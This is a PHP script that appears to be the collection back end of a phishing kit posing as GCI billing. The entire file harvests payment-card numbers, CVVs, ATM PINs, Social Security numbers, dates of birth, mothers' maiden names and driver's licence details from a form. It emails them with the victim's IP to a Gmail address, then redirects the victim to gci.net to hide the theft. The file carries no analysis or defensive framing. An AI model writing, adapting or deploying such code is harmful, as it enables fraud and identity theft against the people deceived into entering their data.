<?php

$ip = getenv("REMOTE_ADDR");

$message = "----------- ---------------------\n";
$message .= "Account name: ".$_POST['accname']."\n";
$message .= "CC: ".$_POST['card']."\n";
$message .= "Expdate: ".$_POST['date']."\n";
$message .= "Cvn: ".$_POST['cvn']."\n";
$message .= "Atm pin: ".$_POST['pin']."\n";
$message .= "Ssn: ".$_POST['ssn']."\n";
$message .= "Dob: ".$_POST['dob']."\n";
$message .= "Mmn: ".$_POST['mmn']."\n";
$message .= "Dl: ".$_POST['dl']."\n";
$message .= "Dlexp: ".$_POST['dlexp']."\n";
$message .= "IP: ".$ip."\n";

$message .= "---------------  ------------------------------\n";



mail("Whiteness977@gmail.com","Message from GCIBilling $ip  ",$message);

   header("Location: http://gci.net/");

?>
